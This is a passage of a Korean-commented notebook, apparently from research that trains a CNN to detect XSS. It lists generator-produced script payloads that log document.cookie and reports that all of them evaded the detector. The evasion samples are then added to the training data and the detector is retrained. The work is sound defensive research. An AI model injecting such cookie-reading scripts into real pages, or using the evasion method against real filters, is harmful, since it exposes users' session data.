# [864/874] 원본: <script>console.log('DUXOC7CGBMDRBHGQ965ERTBDHSELA60WRDS963ICURHLBU7NNR');console.log(document.cookie);</script>
#
# [865/874] 원본: <script>console.log('8EZR9NF1M7RBDQWP2MMB2S47YB5HOFJK1MIUR9INT8GLCQYV38');console.log(document.cookie);</script>
#
# [866/874] 원본: <script>console.log('8II34I5FM6FGDDIS0PGMPEWW48DO652963N88MF2W4VG811ZJ3');console.log(document.cookie);</script>
#
# [867/874] 원본: <script>console.log('0GTD2CA6CLCH4FCF2G7DG9C2FRRNO8NJRC4O4MDW7SKT4TH87T');console.log(document.cookie);</script>
#
# [868/874] 원본: <script>console.log('U4NXYQMWH2S9EMSE2BZ17R11ME5IMLDXF29BAD4GV935YJGLQT');console.log(document.cookie);</script>
#
# [869/874] 원본: <script>console.log('6VKHW4G2QYMS23O2W3A4385921GAOIWIW6WAZZYMI5H5HABYQD');console.log(document.cookie);</script>
#
# [870/874] 원본: <script>console.log('U9E9DRDPO1W4JZT4WVM9UIV61Y65FMNXUI1K8ZCC25E7NM2D74');console.log(document.cookie);</script>
#
# [871/874] 원본: <script>console.log('SD7KD7OQTG8OHMTIS87IHIUYB0DYEUW3TTW3P921XYO65LA9LQ');console.log(document.cookie);</script>
#
# [872/874] 원본: <script>console.log('CDHQ4PAG4W5X2TAO540V4S36PCXILT9SOR43SFGHI3DZASBUWK');console.log(document.cookie);</script>
#
# [873/874] 원본: <script>console.log('IALHRGH3I3LO87QM6QHC5X1U9AAUIWKBD1YU2GDSINRNKTZICO');console.log(document.cookie);</script>
#
# [874/874] 원본: pt>console.log('YKQM5DU827QMR3IODIQHQG5FQEE9VNZ4IJ5WKCE9OIUIR4PICI');console.log(document.cookie);</script>
#
# ✅ 모든 우회 문자열 저장 완료 → generator_output.txt

# %% [markdown]
# 평가

# %%
def evaluate_obfuscation_success(discriminator_model, obf_file_path):
    # 1. 우회 문자열 불러오기
    with open(obf_file_path, "r", encoding="utf-8") as f:
        samples = [line.strip() for line in f if line.strip()]

    total = len(samples)
    fooled = 0

    discriminator_model.eval()
    with torch.no_grad():
        for xss in samples:
            img = string_to_image_matrix(xss)
            tensor = torch.tensor(img, dtype=torch.float32).unsqueeze(0).unsqueeze(0).to(device) / 255.0
            output = discriminator_model(tensor)
            pred = torch.argmax(output, dim=1).item()

            if pred == 0:  # 정상으로 분류 → 탐지 실패
                fooled += 1

    print(f"\n✅ 우회 문자열 평가 결과:")
    print(f" - 전체 개수: {total}")
    print(f" - 탐지 실패 (정상으로 오판): {fooled}")
    print(f" - 우회 성공률: {fooled / total * 100:.2f}%")

# %%
evaluate_obfuscation_success(model, "generator_output.txt")
# Out:
# ✅ 우회 문자열 평가 결과:
#  - 전체 개수: 874
#  - 탐지 실패 (정상으로 오판): 874
#  - 우회 성공률: 100.00%

# %% [markdown]
# D-G GAN 혼합 루트

# %% [markdown]
# 우회 문자열 → 이미지(.npy) 변환 코드

# %%
import numpy as np
import os

def convert_string_to_image_matrix(text, max_len=256):
    arr = np.zeros((16, 16), dtype=np.uint8)
    for i, c in enumerate(text[:max_len]):
        arr[i // 16][i % 16] = ord(c) if ord(c) < 256 else 0
    return arr

def convert_obfuscated_txt_to_npy(input_txt, out_dir):
    with open(input_txt, "r", encoding="utf-8") as f:
        lines = [line.strip() for line in f if line.strip()]

    images = [convert_string_to_image_matrix(t) for t in lines]
    labels = [1] * len(images)  # label 1 = XSS (우회공격도 공격임)

    os.makedirs(out_dir, exist_ok=True)
    np.save(os.path.join(out_dir, "images.npy"), np.array(images))
    np.save(os.path.join(out_dir, "labels.npy"), np.array(labels))
    print(f"✅ 우회 이미지 저장 완료: {out_dir}/images.npy, labels.npy")

# 사용 예시
convert_obfuscated_txt_to_npy("generator_output.txt", "dataset_obfuscated")
# Out:
# ✅ 우회 이미지 저장 완료: dataset_obfuscated/images.npy, labels.npy

# %% [markdown]
# 3개 클래스 병합 후 분할

# %%
def merge_and_split_all_with_existing_splits(
    train_img, train_lbl,
    val_img, val_lbl,
    test_img, test_lbl,
    obf_img, obf_lbl,
    out_dir="dataset_gan_split"
):
    import numpy as np
    import os

    # 기존 분할 데이터 로드
    X_train = np.load(train_img)
    y_train = np.load(train_lbl)
    X_val = np.load(val_img)
    y_val = np.load(val_lbl)
    X_test = np.load(test_img)
    y_test = np.load(test_lbl)

    # 우회 샘플 로드
    X_obf = np.load(obf_img)
    y_obf = np.load(obf_lbl)

    # 비율 유지하며 6:2:2 비율로 분할
    n = len(X_obf)
    n_train = int(n * 0.6)
    n_val = int(n * 0.2)

    X_obf_train, y_obf_train = X_obf[:n_train], y_obf[:n_train]
    X_obf_val, y_obf_val = X_obf[n_train:n_train+n_val], y_obf[n_train:n_train+n_val]
    X_obf_test, y_obf_test = X_obf[n_train+n_val:], y_obf[n_train+n_val:]

    # 병합
    X_train_merge = np.concatenate([X_train, X_obf_train], axis=0)
    y_train_merge = np.concatenate([y_train, y_obf_train], axis=0)

    X_val_merge = np.concatenate([X_val, X_obf_val], axis=0)
    y_val_merge = np.concatenate([y_val, y_obf_val], axis=0)

    X_test_merge = np.concatenate([X_test, X_obf_test], axis=0)
    y_test_merge = np.concatenate([y_test, y_obf_test], axis=0)

    # 저장
    os.makedirs(out_dir, exist_ok=True)
    np.save(os.path.join(out_dir, "train_images.npy"), X_train_merge)
    np.save(os.path.join(out_dir, "train_labels.npy"), y_train_merge)
    np.save(os.path.join(out_dir, "val_images.npy"), X_val_merge)
    np.save(os.path.join(out_dir, "val_labels.npy"), y_val_merge)
    np.save(os.path.join(out_dir, "test_images.npy"), X_test_merge)
    np.save(os.path.join(out_dir, "test_labels.npy"), y_test_merge)

    print(f"✅ 병합 및 저장 완료 → {out_dir}")
    print(f" - Train: {len(X_train_merge)}")
    print(f" - Val:   {len(X_val_merge)}")
    print(f" - Test:  {len(X_test_merge)}")

# %%
merge_and_split_all_with_existing_splits(
    train_img="train_images.npy",
    train_lbl="train_labels.npy",
    val_img="val_images.npy",
    val_lbl="val_labels.npy",
    test_img="test_images.npy",
    test_lbl="test_labels.npy",
    obf_img="dataset_obfuscated/images.npy",
    obf_lbl="dataset_obfuscated/labels.npy",
    out_dir="dataset_gan_split"
)
# Out:
# ✅ 병합 및 저장 완료 → dataset_gan_split
#  - Train: 1718
#  - Val:   430
#  - Test:  433

# %% [markdown]
# Discriminator 재학습 (GAN용)

# %%
# 불러오기
train_loader = create_dataloader_from_files("dataset_gan_split/train_images.npy", "dataset_gan_split/train_labels.npy", shuffle=True)
val_loader = create_dataloader_from_files("dataset_gan_split/val_images.npy", "dataset_gan_split/val_labels.npy")
test_loader = create_dataloader_from_files("dataset_gan_split/test_images.npy", "dataset_gan_split/test_labels.npy")

# 모델 초기화 및 학습
model = DiscriminatorAlexNet()
train_discriminator(model, train_loader, val_loader, epochs=15, lr=1e-3)

# 평가
evaluate_model(model, test_loader)
# Out:
# Epoch 1/15 | Loss: 9.7313 | Train Acc: 0.9139
#            >> Val Acc: 0.9977
# Epoch 2/15 | Loss: 1.6812 | Train Acc: 0.9953
#            >> Val Acc: 1.0000
# Epoch 3/15 | Loss: 0.6190 | Train Acc: 0.9983
#            >> Val Acc: 1.0000
# Epoch 4/15 | Loss: 0.3494 | Train Acc: 0.9988
#            >> Val Acc: 1.0000
# Epoch 5/15 | Loss: 0.3602 | Train Acc: 0.9994
#            >> Val Acc: 1.0000
# Epoch 6/15 | Loss: 0.4436 | Train Acc: 0.9983
#            >> Val Acc: 1.0000
# Epoch 7/15 | Loss: 0.4342 | Train Acc: 0.9983
#            >> Val Acc: 0.9977
# Epoch 8/15 | Loss: 0.1441 | Train Acc: 0.9988
#            >> Val Acc: 0.9977
# Epoch 9/15 | Loss: 0.2001 | Train Acc: 0.9983
#            >> Val Acc: 1.0000
# Epoch 10/15 | Loss: 0.0745 | Train Acc: 0.9994
#            >> Val Acc: 0.9977
# Epoch 11/15 | Loss: 0.0175 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
# Epoch 12/15 | Loss: 0.0015 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
# Epoch 13/15 | Loss: 0.0007 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
# Epoch 14/15 | Loss: 0.0005 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
# Epoch 15/15 | Loss: 0.0004 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
#
# ✅ 최종 테스트 결과:
#               precision    recall  f1-score   support
#
#       Normal       1.00      0.99      0.99       134
#          XSS       0.99      1.00      1.00       299
#
#     accuracy                           1.00       433
#    macro avg       1.00      0.99      0.99       433
# weighted avg       1.00      1.00      1.00       433
